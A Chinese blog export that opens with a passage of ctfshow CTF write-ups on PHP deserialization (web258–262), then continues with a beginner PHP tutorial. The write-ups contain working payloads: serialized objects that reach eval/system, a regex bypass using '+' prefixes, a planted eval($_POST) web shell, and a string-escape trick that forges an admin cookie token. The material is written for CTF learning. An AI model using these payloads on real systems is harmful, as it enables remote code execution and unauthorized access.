很明显，这匹配的就是对象序列化后的开头部分，所以我们需要通过一些手段绕过这个正则匹配，就是在数字前面加个加号来绕过
这次却不能够用之前的脚本来运行，因为对象属性为private的话可能会出现一些未知的错误（做这题的时候被卡在这边有一段时间），所以对象属性最好都为public
脚本如下：
&lt;?phpclass ctfShowUser&#123;    public $username=&#x27;xxxxxx&#x27;;    public $password=&#x27;xxxxxx&#x27;;    public $isVip=true;    public $class = &#x27;backDoor&#x27;;    public function __construct()&#123;        $this-&gt;class=new backDoor();    &#125;&#125;class backDoor&#123;    public $code=&quot;system(&#x27;ls&#x27;);&quot;;    public function getInfo()&#123;        eval($this-&gt;code);    &#125;&#125;$a = new ctfShowUser();echo urlencode(serialize($a));

得到如下：
O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3Bs%3A5%3A%22class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A13%3A%22system%28%27ls%27%29%3B%22%3B%7D%7D

url解码后在相关数字前面加上加号：O:+11:&quot;ctfShowUser&quot;:4:&#123;s:8:&quot;username&quot;;s:6:&quot;xxxxxx&quot;;s:8:&quot;password&quot;;s:6:&quot;xxxxxx&quot;;s:5:&quot;isVip&quot;;b:1;s:5:&quot;class&quot;;O:+8:&quot;backDoor&quot;:1:&#123;s:4:&quot;code&quot;;s:13:&quot;system(&#39;ls&#39;);&quot;;&#125;&#125;
再次编码并使用，得到该目录下存在flag.php
将外部命令换成cat flag.php，得到flag，题目解决
web259（csrf)flag.php的代码如下：
$xff = explode(&#x27;,&#x27;, $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;]);array_pop($xff);$ip = array_pop($xff);if($ip!==&#x27;127.0.0.1&#x27;)&#123;	die(&#x27;error&#x27;);&#125;else&#123;	$token = $_POST[&#x27;token&#x27;];	if($token==&#x27;ctfshow&#x27;)&#123;		file_put_contents(&#x27;flag.txt&#x27;,$flag);	&#125;&#125;

环境代码如下：
&lt;?phphighlight_file(__FILE__);$vip = unserialize($_GET[&#x27;vip&#x27;]);//vip can get flag one key$vip-&gt;getFlag();

题目题解参考：https://blog.csdn.net/qq_45694932/article/details/120498828
需要补充的是，这道题要使用的SoapClient 是 PHP 中自带的一个类，用于实现 SOAP（Simple Object Access Protocol）客户端功能。SOAP 是一种基于 XML 的协议，用于在计算机网络上传输消息。SoapClient 类提供了与 SOAP 服务器进行通信的方法，使得 PHP 程序可以方便地调用基于 SOAP 的 Web 服务
但是自己下载下来的php可能并没有启动该扩展，所以我们可以到配置文件php.ini中搜索extension=soap
如果前面有分号就代表并没有启用，要启用的话就是直接删去分号就成功启用了
web260&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&#x27;flag.php&#x27;);if(preg_match(&#x27;/ctfshow_i_love_36D/&#x27;,serialize($_GET[&#x27;ctfshow&#x27;])))&#123;    echo $flag;&#125;

代码逻辑很简单，序列化也不会影响字符串
所以直接get传参：?ctfshow=ctfshow_i_love_36D
得到flag，题目解决
web261&lt;?phphighlight_file(__FILE__);class ctfshowvip&#123;    public $username;    public $password;    public $code;    public function __construct($u,$p)&#123;        $this-&gt;username=$u;        $this-&gt;password=$p;    &#125;    public function __wakeup()&#123;        if($this-&gt;username!=&#x27;&#x27; || $this-&gt;password!=&#x27;&#x27;)&#123;            die(&#x27;error&#x27;);        &#125;    &#125;    public function __invoke()&#123;        eval($this-&gt;code);    &#125;    public function __sleep()&#123;        $this-&gt;username=&#x27;&#x27;;        $this-&gt;password=&#x27;&#x27;;    &#125;    public function __unserialize($data)&#123;        $this-&gt;username=$data[&#x27;username&#x27;];        $this-&gt;password=$data[&#x27;password&#x27;];        $this-&gt;code = $this-&gt;username.$this-&gt;password;    &#125;    public function __destruct()&#123;        if($this-&gt;code==0x36d)&#123;            file_put_contents($this-&gt;username, $this-&gt;password);        &#125;    &#125;&#125;unserialize($_GET[&#x27;vip&#x27;]);

当类中同时存在__unserialize()和__wakeup()方法时，会调用__unserilize()方法而不调用另一个方法
然后__invoke()也没有什么东西，不用去调用
0x36d对应的是877,并且是弱比较，只要前面是877就行，后面接什么都可以
利用file_put_contents来写入木马文件
综上，脚本如下：
&lt;?phpclass ctfshowvip&#123;    public $username;    public $password;    public function __construct($u,$p)&#123;        $this-&gt;username=$u;        $this-&gt;password=$p;    &#125;&#125;$a = new ctfshowvip(&#x27;877.php&#x27;,&#x27;&lt;?php eval($_POST[&quot;shell&quot;]) ?&gt;&#x27;);echo urlencode(serialize($a));

get传参：?vip=O%3A10%3A%22ctfshowvip%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A7%3A%22877.php%22%3Bs%3A8%3A%22password%22%3Bs%3A30%3A%22%3C%3Fphp+eval%28%24_POST%5B%22shell%22%5D%29+%3F%3E%22%3B%7D
文件成功写入，用蚁剑直连
得到flag，题目解决
web262&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-12-03 02:37:19# @Last Modified by:   h1xa# @Last Modified time: 2020-12-03 16:05:38# @message.php# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);class message&#123;    public $from;    public $msg;    public $to;    public $token=&#x27;user&#x27;;    public function __construct($f,$m,$t)&#123;        $this-&gt;from = $f;        $this-&gt;msg = $m;        $this-&gt;to = $t;    &#125;&#125;$f = $_GET[&#x27;f&#x27;];$m = $_GET[&#x27;m&#x27;];$t = $_GET[&#x27;t&#x27;];if(isset($f) &amp;&amp; isset($m) &amp;&amp; isset($t))&#123;    $msg = new message($f,$m,$t);    $umsg = str_replace(&#x27;fuck&#x27;, &#x27;loveU&#x27;, serialize($msg));    setcookie(&#x27;msg&#x27;,base64_encode($umsg));    echo &#x27;Your message has been sent&#x27;;&#125;highlight_file(__FILE__);

注释中还有message.php界面，访问得到如下代码：
&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-12-03 15:13:03# @Last Modified by:   h1xa# @Last Modified time: 2020-12-03 15:17:17# @email: h1xa@ctfer.com# @link: https://ctfer.com*/highlight_file(__FILE__);include(&#x27;flag.php&#x27;);class message&#123;    public $from;    public $msg;    public $to;    public $token=&#x27;user&#x27;;    public function __construct($f,$m,$t)&#123;        $this-&gt;from = $f;        $this-&gt;msg = $m;        $this-&gt;to = $t;    &#125;&#125;if(isset($_COOKIE[&#x27;msg&#x27;]))&#123;    $msg = unserialize(base64_decode($_COOKIE[&#x27;msg&#x27;]));    if($msg-&gt;token==&#x27;admin&#x27;)&#123;        echo $flag;    &#125;&#125;

从上述代码可以明白要得到flag，token值要等于admin
但是初始的token值是默认等于user的，我们改不了，我们注意到$umsg = str_replace(&#39;fuck&#39;, &#39;loveU&#39;, serialize($msg));是字符替换，可以实现字符逃逸
实现字符逃逸：
所需逃逸的为：&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;一共27个字符，构造27个fuckt=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;

所以我们的payload为：?f=1&amp;m=1&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;
然后访问message.php页面，但是没有见到flag
这是我们需要改一下cookie的路径，改为/message.php如下：
保存并重新刷新一下页面，得到flag，题目解决
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>php</title>
    <url>/2023/10/28/php/php/</url>
    <content><![CDATA[php基础php变量PHP 变量规则：

变量以 $ 符号开始，后面跟着变量的名称

变量名必须以字母或者下划线字符开始

变量名只能包含字母、数字以及下划线（A-z、0-9 和 _ ）

变量名不能包含空格

变量名是区分大小写的（$y 和 $Y 是两个不同的变量）
（注意：php变量和php语句都是区分大小写的）


PHP 没有声明变量的命令，变量在您第一次赋值给它的时候被创建
php有四种不同的变量作用域：local,global,static,parameter。
局部和全局作用域：在所有函数外部定义的变量，拥有全局作用域。除了函数外，全局变量可以被脚本中的任何部分访问，要在一个函数中访问一个全局变量，需要使用 global 关键字。在 PHP 函数内部声明的变量是局部变量，仅能在函数内部访问。
php global关键字

static作用域
当一个函数完成时，它的所有变量通常都会被删除。然而，有时候您希望某个局部变量不要被删除。要做到这一点，请在您第一次声明变量时使用 static 关键字

php的echo,printecho 和 print 区别：

echo - 可以输出一个或多个字符串
print - 只允许输出一个字符串，返回值总为 1

提示：echo 输出的速度比 print 快， echo 没有返回值，print有返回值1
php EOF(heredoc)使用说明PHP EOF(heredoc)是一种在命令行shell（如sh、csh、ksh、bash、PowerShell和zsh）和程序语言（像Perl、PHP、Python和Ruby）里定义一个字符串的方法。
使用概述：


必须后接分号，否则编译通不过。



EOF 可以用任意其它字符代替，只需保证结束标识与开始标识一致。


3. 结束标识必须顶格独自占一行(即必须从行首开始，前后不能衔接任何空白和字符)。

开始标识可以不带引号或带单双引号，不带引号与带双引号效果一致，解释内嵌的变量和转义符号，带单引号则不解释内嵌的变量和转义符号。



当内容需要内嵌引号（单引号或双引号）时，不需要加转义符，本身对单双引号转义，此处相当与q和qq的用法。




php数据类型php字符串（string)
一个字符串是一串字符的序列，就像 “Hello world!”。你可以将任何文本放在单引号和双引号中
php整型（integer)
整数规则：整数必须至少有一个数字 (0-9)；整数不能包含逗号或空格；整数是没有小数点的；整数可以是正数或负数；整型可以用三种格式来指定：十进制， 十六进制（ 以 0x 为前缀）或八进制（前缀为 0）
php浮点型（float）
即带小数部分的数字或是指数形式
var_dump( )函数返回变量的数据类型和值
php布尔型（boolean）
布尔型可以是true或false，通常用于条件判断
php数组（aarray）
可以一个变量储存多个值
&lt;?php $cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);var_dump($cars);?&gt;

php对象（object）
php null值
NULL 值表示变量没有值。NULL 是数据类型为 NULL 的值。
NULL 值指明一个变量是否为空值。 同样可用于数据空值和NULL值的区别。
例子：可以通过设置变量值为 NULL 来清空变量数据：
&lt;?php$x=&quot;Hello world!&quot;;$x=null;var_dump($x);?&gt;

php资源类型（resource）
PHP 资源 resource 是一种特殊变量，保存了到外部资源的一个引用。常见资源数据类型有打开文件、数据库连接、图形画布区域等。
由于资源类型变量保存有为打开文件、数据库连接、图形画布区域等的特殊句柄，因此将其它类型的值转换为资源没有意义。
使用 get_resource_type() 函数可以返回资源（resource）类型

php类型比较松散比较：使用两个&#x3D;&#x3D;比较，只比较值，不比较类型
严格比较：用三个等号&#x3D;&#x3D;&#x3D;比较，除了比较值，也比较类型
php常量一个常量由英文字母、下划线、和数字组成,但数字不能作为首字母出现。 (常量名不需要加 $ 修饰符)。
注意：常量在整个脚本中都可以使用
设置常量，使用define()函数：bool define ( string $name , mixed $value [, bool $case_insensitive = false ] )
例子：define(&quot;GREETING&quot;,&quot;欢迎来到这里&quot;,false)(false可以省略)
该函数有三个参数:

name：必选参数，常量名称，即标志符。

value：必选参数，常量的值。

case_insensitive ：可选参数，如果设置为 TRUE，该常量则大小写不敏感，默认是大小写敏感的。
注意：自 PHP 7.3.0 开始，定义不区分大小写的常量已被弃用。从 PHP 8.0.0 开始，只有 false 是可接受的值，传递 true 将产生一个警告。


php字符串变量php中只有一个字符串运算符，那就是***并置运算符(.)***：把两个字符串连接起来
例子：
&lt;?php$txt1=&quot;Hello world!&quot;;$txt2=&quot;What a nice day!&quot;;echo $txt1 . &quot; &quot; . $txt2;?&gt;//例子中用了两个并置运算符，这是因为在两个字符串中间加了一个空格

php strlen()函数
该函数返回字符串的长度（字节数）
strlen() 常常用在循环和其他函数中，因为那时确定字符串何时结束是很重要的。（例如，在循环中，我们需要在字符串中的最后一个字符之后结束循环。）
php strpos()函数
该函数用于在字符串中查找一个字或一个指定的文本。
如果在字符串中找到匹配，该函数会返回第一个匹配的字符位置。如果未找到匹配，则返回 FALSE
&lt;?phpecho strpos(&quot;Hello world!&quot;,&quot;world&quot;);?&gt;

php运算符php算术运算符

还有一个运算符：**intdiv()**，该函数返回值为第一个参数除于第二个参数的值并向下取整
&lt;?php var_dump(intdiv(10, 3)); ?&gt;
php赋值运算符
“&#x3D;”; “+&#x3D;”; “-&#x3D;”; “*&#x3D;”; “&#x2F;&#x3D;”; “%&#x3D;”; “.&#x3D;”(例子：a.&#x3D;b即a&#x3D;a.b)
php递增&#x2F;递减运算符
++x  ;  x++  ;  –x  ;  x–
php比较运算符

php逻辑运算符

php数组运算符

三元运算符
即？：（跟c语言的三元运算符用法一致）
NULL 合并运算符会判断变量是否存在且值不为NULL，如果是，它就会返回自身的值，否则返回它的第二个操作数。
$site = $_GET[&#39;site&#39;] ?? &#39;php中文网&#39;;
组合运算符
PHP7+ 支持组合比较符（combined comparison operator）也称之为太空船操作符，符号为 **&lt;&#x3D;&gt;**。组合比较运算符可以轻松实现两个变量的比较，当然不仅限于数值类数据的比较。
语法格式如下：
$c = $a &lt;=&gt; $b;

解析如下：

如果 $a &gt; $b, 则 $c 的值为 1。
如果 $a &#x3D;&#x3D; $b, 则 $c 的值为 0。
如果 $a &lt; $b, 则 $c 的值为 -1。

if…else…；switch都与C语言中的用法一致
php数组用array( )函数来创建数组
三种数组：数值数组 - 带有数字 ID 键的数组；关联数组 - 带有指定的键的数组，每个键关联一个值；多维数组 - 包含一个或多个数组的数组
php数值数组
两种方法：自动分配ID键（总是从0开始）；人工分配ID键：$cars[0]=&quot;Volvo&quot;;
count( )函数
用于获取数组的长度（元素的数量）
遍历数值数组
&lt;?php$cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);$arrlength=count($cars);for($x=0;$x&lt;$arrlength;$x++)&#123;    echo $cars[$x];    echo &quot;&lt;br&gt;&quot;;&#125;?&gt;

php关联数组
关联数组是使用分配给数组的指定的键的数组
两种方法
$age=array(&quot;Peter&quot;=&gt;&quot;35&quot;,&quot;Ben&quot;=&gt;&quot;37&quot;,&quot;Joe&quot;=&gt;&quot;43&quot;);or:$age[&#x27;Peter&#x27;]=&quot;35&quot;;$age[&#x27;Ben&#x27;]=&quot;37&quot;;$age[&#x27;Joe&#x27;]=&quot;43&quot;;

如何使用
&lt;?php$age=array(&quot;Peter&quot;=&gt;&quot;35&quot;,&quot;Ben&quot;=&gt;&quot;37&quot;,&quot;Joe&quot;=&gt;&quot;43&quot;);echo &quot;Peter is &quot; . $age[&#x27;Peter&#x27;] . &quot; years old.&quot;;?&gt;

遍历关联数组
使用foreach循环
&lt;?php$age=array(&quot;Peter&quot;=&gt;&quot;35&quot;,&quot;Ben&quot;=&gt;&quot;37&quot;,&quot;Joe&quot;=&gt;&quot;43&quot;);foreach($age as $x=&gt;$x_value)&#123;    echo &quot;Key=&quot; . $x . &quot;, Value=&quot; . $x_value;    echo &quot;&lt;br&gt;&quot;;&#125;?&gt;

php数组排序sort( )
对数组中的元素按照字母升序排列
&lt;?php$cars=array(&quot;Volvo&quot;,&quot;BWM&quot;,&quot;Toyota&quot;);sort($cars);print_r($cars);?&gt;

对数组中的元素按照数字升序排列
rsort( )
对数组中的元素进行字母降序排列
对数组中的元素按照数字降序排列
和上面sort( )用法一致
asort( )
根据数组的值，对关联数组进行升序排列
&lt;?php$age=array(&quot;Peter&quot;=&gt;&quot;35&quot;,&quot;Ben&quot;=&gt;&quot;37&quot;,&quot;Joe&quot;=&gt;&quot;43&quot;); asort($age); print_r($age); ?&gt;

ksort( )
根据数组的键，对关联数组进行升序排列
&lt;?php$age=array(&quot;Peter&quot;=&gt;&quot;35&quot;,&quot;Ben&quot;=&gt;&quot;37&quot;,&quot;Joe&quot;=&gt;&quot;43&quot;);ksort($age);print_r($age);?&gt;

arsort( )
根据数组的值，对关联数组进行降序排列
跟上面用法一致
krsort( )
根据数组的键，对数组进行降序排列
php超级变量php超级全局变量列表：$GLOBALS；$_SERVER；$_REQUEST；$_POST；$_GET；$_FILES；$_ENV；$_COOKIE；$_SESSION
php $GLOBALS
$GLOBALS 是一个包含了全部变量的全局组合数组。变量的名字就是数组的键
&lt;?php $x = 75; $y = 25;function addition() &#123;     $GLOBALS[&#x27;z&#x27;] = $GLOBALS[&#x27;x&#x27;] + $GLOBALS[&#x27;y&#x27;]; &#125;addition(); echo $z; 

php $_SERVER
$_SERVER 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。这个数组中的项目由 Web 服务器创建。不能保证每个服务器都提供全部项目；服务器可能会忽略一些，或者提供一些没有在这里列举出来的项目。
实操：在本地PHP文件中输入一下代码，列出$_SERVER的内容
​			 访问该PHP页面，显示出$_SERVER的全部内容
&lt;?php echo &quot;&lt;pre&gt;&quot;;print_r($_SERVER);?&gt;

$_SERVER中所有的重要元素
php &amp;_REQUEST
PHP $REQUEST 用于收集HTML表单提交的数据。
以下实例显示了一个输入字段（input）及提交按钮(submit)的表单(form)。 当用户通过点击 “Submit” 按钮提交表单数据时, 表单数据将发送至标签中 action 属性中指定的脚本文件。 在这个实例中，我们指定文件来处理表单数据。如果你希望其他的PHP文件来处理该数据，你可以修改该指定的脚本文件名。 然后，我们可以使用超级全局变量 $_REQUEST 来收集表单中的 input 字段数据:
&lt;html&gt;&lt;body&gt;&lt;form method=&quot;post&quot; action=&quot;&lt;?php echo $_SERVER[&#x27;PHP_SELF&#x27;];?&gt;&quot;&gt;Name: &lt;input type=&quot;text&quot; name=&quot;fname&quot;&gt;&lt;input type=&quot;submit&quot;&gt;&lt;/form&gt;&lt;?php$name = $_REQUEST[&#x27;fname&#x27;];echo $name;?&gt;&lt;/body&gt;&lt;/html&gt;

php $_POST
被广泛应用于收集表单数据，在html form标签的指定该属性：method&#x3D;”post”
php $_GET
PHP $_GET 同样被广泛应用于收集表单数据，在HTML form标签的指定该属性：”method&#x3D;”get”。
$_GET 也可以收集URL中发送的数据
while循环跟C语言中的whille循环用法一致
for循环用法与C语言中的一致
foreach循环
和上文所说作用一样，用来遍历数组
每进行一次循环，当前数组元素的值就会被赋值给 $value 变量（数组指针会逐一地移动），在进行下一次循环时，您将看到数组中的下一个值。
foreach ($array as $value)&#123;    要执行代码;&#125;

&lt;?php$x=array(&quot;Google&quot;,&quot;Runoob&quot;,&quot;Taobao&quot;);foreach($x as $value)&#123;    echo $value .PHP_EOL;&#125;?&gt;

每一次循环，当前数组元素的键与值就都会被赋值给 $key 和 $value 变量（数字指针会逐一地移动），在进行下一次循环时，你将看到数组中的下一个键与值。
foreach ($array as $key =&gt; $value)&#123;    要执行代码;&#125;

&lt;?php$x=array(1=&gt;&quot;Google&quot;,2=&gt;&quot;Runoob&quot;,3=&gt;&quot;Taobao&quot;);foreach($x as $key =&gt; $value)&#123;    echo &quot;key 为&quot;.$key.&quot;,对应的value为&quot;.$value.PHP_EOL;&#125;?&gt;

php函数创建语法
&lt;?phpfunction functionName()&#123;    // 要执行的代码&#125;?&gt;

函数准则：函数名称应该显示出它的功能；函数名称以字母或下划线开头（不能以数字开头）
添加函数
参数就在函数名称后面的一个括号内指定
&lt;?phpfunction writeName($fname)&#123;    echo $fname . &quot; Refsnes.&lt;br&gt;&quot;;&#125;echo &quot;My name is &quot;;writeName(&quot;Kai Jim&quot;);echo &quot;My sister&#x27;s name is &quot;;writeName(&quot;Hege&quot;);echo &quot;My brother&#x27;s name is &quot;;writeName(&quot;Stale&quot;);?&gt;

返回值
让函数返回一个值，用return语句
&lt;?phpfunction add($x,$y)&#123;    $total=$x+$y;    return $total;&#125;echo &quot;1 + 16 = &quot; . add(1,16);?&gt;

php魔术常量这八个魔术常量不区分大小写
LINE
文件中的当前行号
LINE旁边是两条下划线
&lt;?phpecho &#x27;这是第 &quot; &#x27;  . __LINE__ . &#x27; &quot; 行&#x27;;?&gt;

FILE
文件的完整路径和文件名。如果用在被包含文件中，则返回被包含的文件名
用法和上面一致，旁边也是两条下滑线
——DIR——
文件所在的目录。如果用在被包括文件中，则返回被包括的文件所在的目录。它等价于 dirname(FILE)。除非是根目录，否则目录中名不包括末尾的斜杠。
——FUNCTION——
函数名称，本常量返回该函数被定义时的名字（区分大小写）
&lt;?phpfunction test() &#123;    echo  &#x27;函数名为：&#x27; . __FUNCTION__ ;&#125;test();?&gt;

——CLASS——
类的名称（PHP 4.3.0 新加）。自 PHP 5 起本常量返回该类被定义时的名字（区分大小写）。在 PHP 4 中该值总是小写字母的。类名包括其被声明的作用区域（例如 Foo\Bar）
&lt;?phpclass test &#123;    function _print() &#123;        echo &#x27;类名为：&#x27;  . __CLASS__ . &quot;&lt;br&gt;&quot;;        echo  &#x27;函数名为：&#x27; . __FUNCTION__ ;    &#125;&#125;$t = new test();$t-&gt;_print();?&gt;

——TRAIT——
没看懂，之后需要认真再理解一遍
——METHOD——
类的方法名。返回该方法被定义时的名字
&lt;?phpfunction test() &#123;    echo  &#x27;函数名为：&#x27; . __METHOD__ ;&#125;test();?&gt;

——NAMESPACE——
当前命名空间的名称（区分大小写）。此常量是在编译时定义的
&lt;?phpnamespace MyProject; echo &#x27;命名空间为：&quot;&#x27;, __NAMESPACE__, &#x27;&quot;&#x27;; // 输出 &quot;MyProject&quot;?&gt;

php命名空间********目前不要求掌握，之后再来学吧
目的是解决重名问题，php不允许两个函数或者类出现相同的名字
PHP 命名空间可以解决以下两类问题：

用户编写的代码与PHP内部的类&#x2F;函数&#x2F;常量或第三方类&#x2F;函数&#x2F;常量之间的名字冲突。
为很长的标识符名称(通常是为了缓解第一类问题而定义的)创建一个别名（或简短）的名称，提高源代码的可读性

定义命名空间必须在所有代码之前声明命名空间
可以在一个文件中定义不同的命名空间代码，建议使用大括号
&lt;?phpnamespace MyProject &#123;    const CONNECT_OK = 1;    class Connection &#123; /* ... */ &#125;    function connect() &#123; /* ... */  &#125;&#125;namespace AnotherProject &#123;    const CONNECT_OK = 1;    class Connection &#123; /* ... */ &#125;    function connect() &#123; /* ... */  &#125;&#125;?&gt;

将全局的非命名空间中的代码与命名空间中的代码组合在一起，只能使用大括号形式的语法。全局代码必须用一个不带名称的 namespace 语句加上大括号括起来
&lt;?phpnamespace MyProject &#123;const CONNECT_OK = 1;class Connection &#123; /* ... */ &#125;function connect() &#123; /* ... */  &#125;&#125;namespace &#123; // 全局代码session_start();$a = MyProject\connect();echo MyProject\Connection::start();&#125;?&gt;

在声明命名空间之前唯一合法的代码是用于定义源文件编码方式的 declare 语句
declare(encoding=&#x27;UTF-8&#x27;); //定义多个命名空间和不包含在命名空间中的代码

子命名空间与目录和文件的关系很像，PHP 命名空间也允许指定层次化的命名空间的名称
namespace MyProject\Sub\Level;  //声明分层次的单个命名空间

命名空间的使用php面向对象对象的主要三个特性：
对象的行为：对象可以执行的操作，比如：开灯，关灯就是行为。
对象的形态：对对象不同的行为是如何响应的，比如：颜色，尺寸，外型。
对象的表示：对象的表示就相当于身份证，具体区分在相同的行为与状态下有什么不同。

比如 Animal(动物) 是一个抽象类，我们可以具体到一只狗跟一只羊，而狗跟羊就是具体的对象，他们有颜色属性，可以写，可以跑等行为状态。
面向对象编程的三个主要特性：
封装（Encapsulation）：指将对象的属性和方法封装在一起，使得外部无法直接访问和修改对象的内部状态。通过使用访问控制修饰符（public、private、protected）来限制属性和方法的访问权限，从而实现封装。
继承（Inheritance）：指可以创建一个新的类，该类继承了父类的属性和方法，并且可以添加自己的属性和方法。通过继承，可以避免重复编写相似的代码，并且可以实现代码的重用。
多态（Polymorphism）：指可以使用一个父类类型的变量来引用不同子类类型的对象，从而实现对不同对象的统一操作。多态可以使得代码更加灵活，具有更好的可扩展性和可维护性。在 PHP 中，多态可以通过实现接口（interface）和使用抽象类（abstract class）来实现。

php类定义语法格式如下：
&lt;?phpclass phpClass &#123;  var $var1;  var $var2 = &quot;constant string&quot;;    function myfunc ($arg1, $arg2) &#123;     [..]  &#125;  [..]&#125;?&gt;

其中 var相当于是 public的别名；函数定义类似 PHP 函数的定义，但函数只能通过该类及其实例化的对象访问
php中创建对象创建完类后，可以使用new运算符来实例化该类的对象 $runoob=new Site;
调用成员方法在实例化对象后，我们可以使用该对象调用成员方法，该对象的成员方法只能操作该对象的成员变量
以下为上述三种的完整代码例子：
&lt;?phpclass Site&#123;    //成员变量    var $url;    var $title;    //成员函数    function setUrl($par)&#123;        $this-&gt;url=$par;    &#125;    function getUrl()&#123;        echo $this-&gt;url .PHP_EOL;    &#125;    function setTitle($par)&#123;        $this-&gt;title=$par;    &#125;    function getTitle()&#123;        echo $this-&gt;title.PHP_EOL;    &#125;&#125;$runoob=new Site;$taobao=new Site;$google=new Site;//调用成员函数$runoob-&gt;setTitle(&quot;菜鸟教程&quot;);$taobao-&gt;setTitle(&quot;淘宝&quot;);$google-&gt;setTitle(&quot;Google 搜索&quot;);$runoob-&gt;setUrl(&#x27;www.runoob.com&#x27;);$taobao-&gt;setUrl(&#x27;www.taobao.com&#x27;);$google-&gt;setUrl(&#x27;www.google.com&#x27;);//调用成员函数，获得标题和URL$runoob-&gt;getTitle();$taobao-&gt;getTitle();$google-&gt;getTitle();$runoob-&gt;getUrl();$taobao-&gt;getUrl();$google-&gt;getUrl();?&gt;

PHP_EOL 是文本换行，并不是 html 换行
如果想在网页里面做到换行：一种是在最前面加上 echo &quot;&lt;pre&gt;&quot;做文本格式化处理；另一种是将PHP_EOL改成”
php构造函数主要用来在创建对象时初始化对象， 即为对象成员变量赋初始值，在创建对象的语句中与 new 运算符一起使用。
允许在一个类中定义一个方法作为构造函数，语法格式如下
void __construct([ mixed $args [, $...]])

例子：初始化$url和$title变量
function __construct( $par1, $par2 ) &#123;   $this-&gt;url = $par1;   $this-&gt;title = $par2;&#125;

可以将上面得代码精简如下
&lt;?phpclass Site&#123;    //成员变量    var $url;    var $title;    function __construct($par1,$par2)&#123;        $this-&gt;url=$par1;        $this-&gt;title=$par2;    &#125;    //成员函数    function setUrl($par)&#123;        $this-&gt;url=$par;    &#125;    function getUrl()&#123;        echo $this-&gt;url .PHP_EOL;    &#125;    function setTitle($par)&#123;        $this-&gt;title=$par;    &#125;    function getTitle()&#123;        echo $this-&gt;title.PHP_EOL;    &#125;&#125;$runoob=new Site(&#x27;www.runoob.com&#x27;,&#x27;菜鸟教程&#x27;);$taobao=new Site(&#x27;www.taobao.com&#x27;,&#x27;淘宝&#x27;);$google=new Site(&#x27;ww.google.com&#x27;,&#x27;Google 搜索&#x27;);//调用成员函数，获得标题和URL$runoob-&gt;getTitle();$taobao-&gt;getTitle();$google-&gt;getTitle();$runoob-&gt;getUrl();$taobao-&gt;getUrl();$google-&gt;getUrl();?&gt;

析构函数当对象结束其生命周期时（例如对象所在的函数已调用完毕），系统自动执行析构函数
语法：void __destruct(void)
&lt;?phpclass MyDestructableClass &#123;   function __construct() &#123;       print &quot;构造函数\n&quot;;       $this-&gt;name = &quot;MyDestructableClass&quot;;   &#125;   function __destruct() &#123;       print &quot;销毁 &quot; . $this-&gt;name . &quot;\n&quot;;   &#125;&#125;$obj = new MyDestructableClass();?&gt;

继承使用extends来继承一个类（并可以扩展其功能），语法格式如下
class Child extends Parent&#123;	//代码部分&#125;

方法重写如果从父类继承的方法不能满足子类的需求，可以对其进行改写，这个过程叫方法的覆盖（override），也称为方法的重写。下面为gerUrl方法得重写
function getUrl()&#123;	echo $this-&gt;url . PHP_EOL;	return $this-&gt;url;&#125;

访问控制PHP 对属性或方法的访问控制，是通过在前面添加关键字 public（公有），protected（受保护）或 private（私有）来实现的。

public（公有）：公有的类成员可以在任何地方被访问。
protected（受保护）：受保护的类成员则只能被其类自身以及其子类和父类访问中访问，就是说要在类中构造一些公有的函数来使用受保护的对象。
private（私有）：私有的类成员则只能被其定义所在的类访问（定义公用的函数来进行使用）。

属性的访问控制
类属性必须定义为公有，受保护，私有之一。如果用 var 定义，则被视为公有
方法的访问控制
类中的方法可以被定义为公有，私有或受保护。如果没有设置这些关键字，则该方法默认为公有。
接口使用接口（interface），可以指定某个类必须实现哪些方法，但不需要定义这些方法的具体内容。
接口是通过 interface 关键字来定义的，就像定义一个标准的类一样，但其中定义所有的方法都是空的。
接口中定义的所有方法都必须是公有，这是接口的特性。
要实现一个接口，使用 implements 操作符。类中必须实现接口中定义的所有方法，否则会报一个致命错误。类可以实现多个接口，用逗号来分隔多个接口的名称。（下面这段代码好好理解，懂了差不多就懂了接口怎么用）
&lt;?phpinterface Animal &#123;public function call();public function run();&#125;class HasName &#123;protected $name = &#x27;name&#x27;;public function getName() &#123;return $this-&gt;name;&#125;&#125;class Cat extends HasName implements Animal &#123;protected $name = &#x27;cat&#x27;;public function call() &#123;echo $this-&gt;getName() . &#x27;: 喵喵叫～&#x27; . PHP_EOL;&#125;public function run() &#123;echo $this-&gt;getName() . &#x27;在跑～&#x27; . PHP_EOL;&#125;&#125;class Dog extends HasName implements Animal &#123;protected $name = &#x27;dog&#x27;;public function call() &#123;echo $this-&gt;getName() . &#x27;: 汪汪叫～&#x27; . PHP_EOL;&#125;public function run() &#123;echo $this-&gt;getName() . &#x27;在跑～&#x27; . PHP_EOL;&#125;&#125;

输出的结果为：
cat: 喵喵叫～cat在跑～dog: 汪汪叫～dog在跑～

常量可以把在类中始终保持不变的值定义为常量。在定义和使用常量的时候不需要使用 $ 符号。
常量的值必须是一个定值，不能是变量，类属性，数学运算的结果或函数调用。
